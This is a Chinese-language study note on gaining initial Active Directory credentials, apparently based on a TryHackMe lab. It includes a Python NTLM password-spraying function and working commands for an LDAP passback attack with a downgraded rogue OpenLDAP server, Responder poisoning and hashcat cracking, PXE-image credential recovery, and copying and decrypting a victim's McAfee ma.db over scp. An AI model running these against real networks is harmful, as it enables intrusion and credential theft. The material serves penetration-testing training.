
#### 目录
- [外部攻击面](#外部攻击面-external-attack-vectors)
- [内部网络利用](#内部网络利用-internal-network-exploitation)

#### 概述 (Overview)

在对活动目录 (Active Directory, AD) 进行攻击，如执行权限提升、横向移动或达成最终目标之前，首要步骤是获得**初始访问权限 (Initial Access)**。核心目标是获取一套任何有效的 AD 凭证。在此阶段，凭证的权限级别并不重要，即使是权限最低的账户也足以作为立足点，因为它能解锁对 AD 自身的进一步枚举能力。获取初始凭证的攻击面非常广泛，涵盖了从外部利用公开信息到内部利用网络协议漏洞的多种方法。

#### 外部攻击面 (External Attack Vectors)

这些方法通常从组织内部网络之外发起，旨在获取可用于登录内部系统的凭证。

- **开源情报 (Open-Source Intelligence, OSINT)**：
    - **定义**：通过分析公开披露的信息来发现凭证。
    - **常见来源**：
        - **公开论坛**：用户在 Stack Overflow 等网站提问时不慎泄露了敏感信息。
        - **代码仓库**：开发者将含有硬编码凭证的脚本上传到 GitHub 等平台。
        - **数据泄露**：员工使用工作邮箱注册外部网站，而这些网站发生数据泄露。HaveIBeenPwned 和 DeHashed 等平台可用于查询邮箱是否涉及已知的泄露事件。

- **网络钓鱼 (Phishing)**：
    - **定义**：一种社会工程学攻击，是获取初始访问权限的常用且高效的手段。
    - **主要形式**：
        - **凭证窃取**：诱骗用户在伪造的登录页面上输入其 AD 凭证。
        - **恶意软件植入**：诱使用户运行一个应用程序，该程序在后台安装远程访问木马 (Remote Access Trojan, RAT)。RAT 在用户上下文中执行，攻击者可立即获得该用户账户的访问权限。

- **暴露的认证服务 (Exposed Authentication Services)**：
    - 许多内部服务可能会意外地暴露在互联网上，这些服务通常与 AD 集成以进行用户认证，从而成为攻击入口。常见的暴露服务包括：
        - Outlook Web App (OWA) 登录门户。
        - 远程桌面协议 (Remote Desktop Protocol, RDP) 服务。
        - 与 AD 集成的 VPN 端点。
        - 使用 NetNTLM 认证的面向公众的 Web 应用程序。
    - **密码喷洒 (Password Spraying)**：
        - **定义**：一种针对上述暴露服务的暴力破解变种。攻击者使用一个或几个常见密码（如 `Changeme123`），去尝试大量不同的用户名。这种“低速慢扫”的方式旨在避免触发账户锁定策略。
        - **检测方式**：尽管可以规避单账户锁定，但该攻击会在短时间内产生大量来自同一源 IP 的失败登录尝试，容易被安全监控系统检测到。
        - **实现示例**：攻击脚本可通过发送认证请求并监控 HTTP 响应状态码来判断凭证有效性。

            Python
            
            ```
            # 脚本核心逻辑：遍历用户列表，使用单一密码尝试 NTLM 认证
            def password_spray(self, password, url):
                print("[*] Starting password spray attack using password: " + password)
                count = 0
                for user in self.users:
                    # 使用 requests 库和 HttpNtlmAuth 发送认证请求
                    response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            
                    # HTTP 200 表示成功，HTTP 401 表示失败
                    if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): # 通常是 200
                        print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                        count += 1
                        continue
                    if (self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE): # 通常是 401
                        print("[-] Failed login with Username: " + user)
            
                print("[*] Attack completed, " + str(count) + " valid pairs found")
            ```
            
#### 内部网络利用 (Internal Network Exploitation)

当攻击者获得对内部网络的物理或逻辑访问权限后（例如，通过在会议室接入恶意设备），可以利用多种协议和配置缺陷来获取凭证。

- **LDAP 绑定凭证 (LDAP Bind Credentials)**：
    - **背景**：许多第三方应用（如 Gitlab, Jenkins）和网络设备（如打印机）使用轻量级目录访问协议 (Lightweight Directory Access Protocol, LDAP) 与 AD 集成。这些应用通常需要一组固定的 AD 凭证（绑定凭证）来查询 AD。
    - **攻击方式**：
        - **读取配置文件**：如果能获得对托管这些应用或设备的服务器的访问权限，通常可以在其配置文件中以明文形式找到 LDAP 绑定凭证。
        - **LDAP 回传攻击 (LDAP Callback Attack)**：当无法直接读取密码但可以修改设备配置时，此攻击非常有效。攻击者将设备配置中的 LDAP 服务器地址修改为自己控制的恶意服务器地址。当设备尝试“测试连接”时，它会向攻击者的服务器发起认证，从而泄露凭证。
    - **示例：执行 LDAP 回传攻击**
        1. **目标识别**：发现一台网络打印机 (`http://printer.za.tryhackme.com`) 的管理界面存在配置缺陷，允许修改 LDAP 服务器设置。
        2. **问题分析**：直接使用 `netcat` 监听 389 端口会收到连接，但由于客户端与服务器之间存在安全认证方法协商（SASL），凭证不会以明文发送。
        3. **部署恶意 LDAP 服务器**：为了强制使用不安全的认证，需要部署一个伪造的 LDAP 服务器 (OpenLDAP)。
            
            Bash
            
            ```
            # 安装 OpenLDAP
            sudo apt-get update && sudo apt-get -y install slapd ldap-utils
            # 重新配置 slapd，选择低安全级别，并设置目标域名
            sudo dpkg-reconfigure -p low slapd
            ```
            
        4. **降低安全配置**：创建一个名为 `olcSaslSecProps.ldif` 的文件，强制服务器禁用匿名访问并支持明文密码传输。
            
            LDIF
            
            ```
            # olcSaslSecProps.ldif
            dn: cn=config
            replace: olcSaslSecProps
            olcSaslSecProps: noanonymous,minssf=0,passcred
            ```
            
        5. **应用配置**：使用 `ldapmodify` 命令应用该配置。
            
            Bash
            
            ```
            sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
            ```
            
        6. **凭证捕获**：启动网络抓包工具（如 `tcpdump`）监听恶意服务器的流量。在打印机 Web 界面上触发 LDAP 测试连接，即可在抓包结果中捕获到明文凭证。

- **网络协议中毒 (Network Protocol Poisoning)**：
    - **背景**：在 Windows 网络中，当 DNS 解析失败时，主机会回退使用链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 在本地网络中广播查询。攻击者可以应答这些广播，将客户端流量重定向到自己。Web 代理自动发现 (WPAD) 协议也易受类似攻击。
    - **工具**：Responder 是执行此类中间人攻击的常用工具。
    - **攻击流程**：
        1. **启动 Responder**：在攻击机上运行 Responder，使其监听特定网络接口。
            
            Bash
            
            ```
            sudo responder -I <interface>
            ```
            
        2. **毒化与拦截**：Responder 会监听 LLMNR, NBT-NS 和 WPAD 请求，发送伪造的响应，声称自己是客户端正在寻找的主机。当客户端连接到 Responder 托管的伪造服务（如 SMB）时，会发送其 NetNTLMv2-SSP 哈希。
            
            Plaintext
            
            ```
            [+] Listening for events...
            [SMBv2] NTLMv2-SSP Client   : <Client IP>
            [SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
            [SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
            ```
            
        3. **离线破解**：将捕获到的 NetNTLMv2 哈希保存到文件，使用 `hashcat` 进行离线破解。
            
            Bash
            
            ```
            # -m 5600 指定哈希类型为 NetNTLMv2
            hashcat -m 5600 <hash_file> <wordlist_file> --force
            ```
            
    - **传递挑战 (Pass-the-Challenge)**：一种更高级的攻击，攻击者不破解哈希，而是将截获的认证质询实时中继到目标服务器，从而冒充用户。此攻击成功的前提是 SMB 签名被禁用且被中继的账户在目标上有足够权限。

- **利用基础设施管理工具 (Exploiting Infrastructure Management Tools)**：
    - **背景**：微软部署工具包 (MDT) 和系统中心配置管理器 (SCCM) 用于大规模自动化部署和管理操作系统。这些工具的配置文件中可能包含敏感凭证。
    - **预启动执行环境 (PXE Boot)**：组织使用 PXE 启动来通过网络安装操作系统。MDT 可用于托管 PXE 启动镜像。
    - **示例：从 PXE 启动镜像恢复凭证**
        1. **信息获取**：通过 DHCP 或其他方式获取 MDT 服务器 IP 和 BCD 启动配置文件的路径（如 `\Tmp\x64{...}.bcd`）。
        2. **下载 BCD 文件**：使用 `tftp` 下载 BCD 文件。
            
            PowerShell
            
            ```
            tftp -i <MDT_SERVER_IP> GET "\Tmp\x64{...}.bcd" conf.bcd
            ```
            
        3. **解析 BCD 文件**：使用 `PowerPXE` 等工具从 BCD 文件中解析出 Windows 启动镜像 (.wim) 的位置。
            
            PowerShell
            
            ```
            Import-Module .\PowerPXE.ps1
            Get-WimFile -bcdFile "conf.bcd"
            ```
            
        4. **下载 WIM 镜像**：再次使用 `tftp` 下载 `.wim` 文件。
            
            PowerShell
            
            ```
            tftp -i <MDT_SERVER_IP> GET "<PXE_Boot_Image_Location>" pxeboot.wim
            ```
            
        5. **提取凭证**：使用 `PowerPXE` 脚本或手动挂载镜像，查找 `bootstrap.ini` 文件，从中恢复用于域加入的明文凭证。
            
            PowerShell
            
            ```
            Get-FindCredentials -WimFile pxeboot.wim
            # 输出示例
            # >>>> DeployRoot = \\THMMDT\MTDBuildLab$
            # >>>> UserID = <account>
            # >>>> UserDomain = ZA
            # >>>> UserPassword = <password>
            ```
            
- **利用本地配置文件 (Exploiting Local Configuration Files)**：
    - **背景**：在获得对某台主机的访问权限后，检查各类应用程序的配置文件是寻找凭证的有效方法。自动化枚举脚本（如 Seatbelt）可以协助此过程。
    - **示例：从 McAfee Agent 数据库恢复凭证**
        1. **定位文件**：McAfee Agent 将其配置（包括连接凭证）存储在一个名为 `ma.db` 的 SQLite 数据库文件中，通常位于 `C:\ProgramData\McAfee\Agent\DB\`。
        2. **拷贝文件**：使用 `scp` 等工具将 `ma.db` 文件从受害主机复制到攻击机。
            
            Bash
            
            ```
            scp user@victim_host:C:/ProgramData/McAfee/Agent/DB/ma.db .
            ```
            
        3. **读取数据库**：使用 `sqlitebrowser` 等工具打开 `ma.db` 文件，并浏览 `AGENT_REPOSITORIES` 表。
        4. **解密密码**：表中的 `AUTH_PASSWD` 字段是加密的。McAfee 使用一个已知的密钥进行加密，可以使用公开的解密脚本来恢复明文密码。
            
            Bash
            
            ```
            python mcafee_sitelist_pwd_decrypt.py <ENCRYPTED_AUTH_PASSWD_VALUE>
            ```